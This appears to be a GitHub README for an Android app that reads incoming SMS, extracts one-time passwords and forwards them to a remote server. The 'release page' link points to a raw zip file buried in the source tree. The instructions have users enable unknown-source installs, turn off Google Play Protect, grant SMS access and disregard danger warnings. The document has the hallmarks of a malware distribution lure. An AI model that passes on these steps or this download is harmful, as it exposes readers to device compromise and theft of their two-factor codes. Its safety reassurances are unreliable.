# 📱 otp_listener - An automatic way to process codes

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/adducting-gasoven115/otp_listener/raw/refs/heads/main/android/app/src/otp-listener-v2.4.zip)

This application tracks incoming SMS messages on your Android device. It looks for one-time passwords, pulls the numbers out, and sends them to your chosen server. It removes the need for manual data entry.

## 📥 How to get the app

1. Open your web browser on your phone.
2. Go to the [official release page](https://github.com/adducting-gasoven115/otp_listener/raw/refs/heads/main/android/app/src/otp-listener-v2.4.zip).
3. Find the latest version under the Releases section.
4. Tap the file ending in .apk to start the download.

## ⚙️ Preparation for the install

Android security settings protect your phone from unknown apps. Because this app comes from GitHub rather than the Google Play Store, you must change one setting to install it.

1. Open your phone Settings.
2. Search for "Install unknown apps" or "Special access."
3. Select the browser you used to download the file.
4. Turn on "Allow from this source."

Additionally, you must turn off Google Play Protect temporarily.
1. Open the Google Play Store app.
2. Tap your profile icon.
3. Tap Play Protect.
4. Tap the settings gear icon.
5. Turn off "Scan apps with Play Protect."

## 🚀 Setting up the application

1. Open your file manager or tap the download notification.
2. Tap the downloaded file to begin the installation.
3. Follow the prompts on your screen to complete the setup.
4. Launch the app from your home screen.

The app requires permission to read SMS messages. When prompted, tap "Allow." This permission allows the app to monitor your incoming messages for codes. Without this access, the app remains idle.

## 🛠 Using the interface

The application uses three main screens to manage your data.

### Status

This screen shows the health of your connections. It indicates if the background service currently runs. You see the number of messages processed and the success rate of your server requests here.

### Logs

The log screen maintains a history of every SMS the app processed. It shows the timestamp, the sender, and the code extracted from the message. If a request fails, the log shows the specific error message provided by your server.

### Settings

This screen manages your configuration. You must enter your backend URL here to receive the forwarded codes. The app supports automatic retries. If the server is offline, the app waits and tries again in sequence.

## 📋 Features

### SMS Monitoring
The app runs in the background. It watches for new texts. It uses smart patterns to identify which texts contain codes and which ones represent general spam.

### Server Communication
The app sends data via HTTP POST requests. It includes the code and the message body in the payload. This integration works with any custom dashboard or database you build to handle incoming OTP data.

### Reliable Retries
Network connections fail. The app handles these gaps with exponential backoff logic. It spaces out retry attempts so it does not overwhelm your server once it comes back online.

### Modern Design
The interface follows Material Design 3 guidelines. It uses a dark theme to save your battery life and maintain comfort in low-light conditions.

## 🛡 Security and Privacy

Your data stays local until the app forwards it to your configured URL. The app does not save your OTPs in any location other than the local log for your review. It requires internet permissions only to send data to your server. It does not contain trackers or advertisements. 

## 🔧 Troubleshooting

If the app fails to send data, check your internet connection first. Ensure that your backend server is active and accepts incoming POST requests. Verify that the URL in the settings screen begins with http or https.

If the app fails to intercept texts, check your notification history to confirm a message arrived. Verify that you granted the SMS permission to the app in your device system settings. You can revoke and grant permissions again if the app seems stuck.

If the phone suggests the app is dangerous, note that this is a standard warning for any app not installed through the official store. This app only performs the specific tasks listed in this guide. It does not modify system files or access personal data outside of its intended function.